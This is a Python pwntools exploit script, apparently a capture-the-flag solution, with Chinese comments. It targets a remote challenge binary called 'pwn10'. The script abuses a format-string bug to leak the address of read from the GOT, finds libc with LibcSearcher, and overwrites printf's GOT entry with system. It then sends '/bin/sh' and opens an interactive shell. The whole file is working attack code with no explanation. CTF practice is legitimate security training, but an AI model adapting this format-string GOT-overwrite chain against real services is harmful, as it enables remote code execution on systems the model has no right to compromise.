from pwn import *
from LibcSearcher import LibcSearcher
from Crypto.Util.number import *

context.arch = 'amd64'
context.log_level = 'debug'

# io = process("./pwn10")
io = remote("gz.imxbt.cn", 20683)
elf = ELF("./pwn10")

printf_got = elf.got['printf']
read_got = elf.got['read']
success("printf_got: " + hex(printf_got))
success("read_got: " + hex(read_got))
payload = b'aaaa'
io.sendline(payload)
io.recvuntil(b'aaaa')

# 泄露 read 地址
payload = b'bbbb%7$s' + p64(read_got)
io.sendline(payload)
io.recvuntil(b'bbbb')
leak = io.recv(6)
read_addr = u64(leak.ljust(8, b'\x00'))
success("read: " + hex(read_addr))
libc=LibcSearcher("read", read_addr)

# 计算 libc 基地址与 system 地址
libc_base = read_addr - libc.dump('read')
system = libc_base + libc.dump('system')
success("libc_base: " + hex(libc_base))
success("system: " + hex(system))

# 利用 fmtstr 覆盖 GOT 中的 printf -> system
payload = fmtstr_payload(6, {printf_got: system})
log.info("fmt payload len: %d" % len(payload))
io.sendline(payload)

# 触发 system("/bin/sh")
io.recv(timeout=0.5)
io.sendline(b'/bin/sh')

io.interactive()
